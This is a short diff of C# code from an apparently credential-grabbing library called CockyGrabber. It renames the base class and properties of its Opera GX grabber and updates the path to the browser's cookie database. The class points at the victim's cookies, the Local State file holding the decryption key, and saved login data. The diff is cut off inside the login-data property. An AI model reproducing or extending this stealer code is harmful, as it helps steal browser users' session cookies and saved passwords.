@@ -2,24 +2,24 @@
 
 namespace CockyGrabber.Grabbers
 {
-    public class OperaGxGrabber : ChromiumGrabber
+    public class OperaGxGrabber : BlinkGrabber
 
     {
-        public override string ChromiumBrowserCookiePath
+        public override string CookiePath
         {
             get
             {
-                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Cookies";
+                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies";
             }
         }
-        public override string ChromiumBrowserLocalStatePath
+        public override string LocalStatePath
         {
             get
             {
                 return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State";
             }
         }
-        public override string ChromiumBrowserLoginDataPath
+        public override string LoginDataPath
         {
             get
             {
